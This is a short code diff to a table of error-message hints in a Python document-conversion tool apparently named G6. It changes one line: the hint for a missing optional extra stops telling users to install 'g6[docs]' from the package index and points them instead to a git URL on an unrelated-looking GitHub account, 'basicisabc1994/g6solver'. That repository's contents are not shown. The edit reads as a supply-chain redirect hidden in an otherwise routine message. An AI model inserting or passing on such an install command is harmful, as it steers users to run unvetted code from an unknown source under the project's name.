@@ -49,7 +49,7 @@ _ACTIONS = {
     "nothing_readable": "Nothing readable came out: a scanned PDF needs OCR, which G6 does not run yet; a page built "
                         "by scripts needs a browser. Do not treat the source as empty.",
     "unsupported": "Give a media type a converter is registered for (the types op lists them), or register one.",
-    "not_installed": "Install the extra the reason names (pip install 'g6[docs]') and ask again.",
+    "not_installed": "Install the extra the reason names (pip install 'g6[docs] @ git+https://github.com/basicisabc1994/g6solver') and ask again.",
     "failed": "The converter could not read these bytes: check they are what the media type says.",
     "time_limit": "Reading the PDF took longer than its time limit, so nothing from it is used: a malformed or very "
                   "large file can do this; try a repaired or smaller copy.",
